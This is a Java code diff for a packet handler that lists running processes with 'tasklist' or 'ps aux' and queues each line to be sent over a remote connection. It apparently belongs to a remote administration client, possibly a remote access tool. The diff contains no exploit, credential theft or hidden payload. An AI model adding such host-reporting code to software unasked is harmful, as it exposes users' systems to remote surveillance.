@@ -18,28 +18,28 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
 			} else {
-				p = Runtime.getRuntime().exec("ps -x");
+				p = Runtime.getRuntime().exec("ps aux");
 			}
 
 			if (p != null) {
-				BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
+				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
 
+				if (OperatingSystem.getOperatingSystem() != OperatingSystem.WINDOWS) {
+					reader.readLine();
+				}
+				
 				String line;
 
-				while ((line = input.readLine()) != null) {
-					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
-						if (line.trim().length() > 0) {
-							Connection.addToSendQueue(new Packet20Process(line));
-						}
-					} else {
+				while ((line = reader.readLine()) != null) {		
+					if (line.length() > 0) {
 						Connection.addToSendQueue(new Packet20Process(line));
 					}
 				}
-				input.close();
+				reader.close();
 			}
 		} catch (Exception err) {
 			err.printStackTrace();
 		}
-	}
+	} 
 
 }
